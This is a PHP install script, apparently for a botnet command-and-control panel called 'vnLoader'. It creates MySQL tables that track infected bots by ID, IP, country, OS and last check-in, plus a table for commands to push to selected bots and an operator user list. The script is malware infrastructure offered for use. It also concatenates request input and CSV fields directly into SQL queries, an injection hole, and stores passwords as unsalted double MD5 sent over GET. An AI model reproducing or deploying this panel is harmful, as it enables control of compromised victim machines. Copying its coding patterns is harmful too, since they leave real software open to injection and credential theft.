<?php

if(!isset($_GET['user']) || !isset($_GET['pass']))
{
	$page  = '<html><head></head><body style="font-family: Consolas"><form action="install.php" method="get">';
	$page .= 'Username: <input type="text" name="user" size="30" /><br />';
	$page .= 'Password: <input type="text" name="pass" size="30" /><br />';
	$page .= '<input type="submit" value="Install"></form>';
	
	print$page;
}
else
{

	define ( "vnLoader" , '' );
	include ( "./sql.inc.php" );

	mysql_query("CREATE TABLE IF NOT EXISTS `botlist` (
	  `tableid` bigint(255) NOT NULL AUTO_INCREMENT,
	  `ID` varchar(255) NOT NULL,
	  `IP` varchar(255) NOT NULL,
	  `COUNTRY` varchar(255) NOT NULL,
	  `OS` varchar(255) NOT NULL,
	  `LastPing` varchar(255) NOT NULL,
	  `VERSION` varchar(255) NOT NULL,
	  PRIMARY KEY (`tableid`)
	) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=15 ;");

	mysql_query("CREATE TABLE IF NOT EXISTS `charts` (
	  `id` int(255) NOT NULL AUTO_INCREMENT,
	  `bots` bigint(255) NOT NULL,
	  `date` varchar(255) NOT NULL,
	  PRIMARY KEY (`id`)
	) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=8;");

	mysql_query("INSERT INTO `charts` (`id`, `bots`, `date`) VALUES
	(1, 0, '00.00.0000');");

	mysql_query("CREATE TABLE IF NOT EXISTS `IPtoCountry` (
	`IP_from` DOUBLE NOT NULL ,
	`IP_to` DOUBLE NOT NULL ,
	`zwei` CHAR( 2 ) NOT NULL ,
	`drei` CHAR( 3 ) NOT NULL ,
	`name` VARCHAR( 50 ) NOT NULL
	);");

	mysql_query("CREATE TABLE IF NOT EXISTS `commands` (
	  `id` int(255) NOT NULL AUTO_INCREMENT,
	  `cmd` varchar(255) NOT NULL,
	  `param` longtext NOT NULL,
	  `bots` longtext NOT NULL,
	  `user` varchar(255) NOT NULL,
	  PRIMARY KEY (`id`)
	) ENGINE=MyISAM DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;");

	mysql_query("CREATE TABLE IF NOT EXISTS `userlist` (
	  `id` varchar(255) NOT NULL,
	  `pass` varchar(255) NOT NULL,
	  `permission` varchar(255) NOT NULL,
	  PRIMARY KEY (`id`)
	) ENGINE=MyISAM DEFAULT CHARSET=latin1;");

	mysql_query("INSERT INTO `userlist` (`id`, `pass`, `permission`) VALUES
	('" . $_GET['user'] .  "', '" . md5(md5($_GET['pass'])) .  "', '*');");

	$handle = fopen("ip-to-country.csv", "r");

	while ($zeile = fgetcsv($handle, 1024, ',', '"')) {
	$sql = "INSERT INTO IPtoCountry VALUES('".$zeile[0]."', '".$zeile[1]."', '".$zeile[2]."', '".$zeile[3]."', '".$zeile[4]."');";
	mysql_query($sql);
	}

	fclose($handle);
}
?> 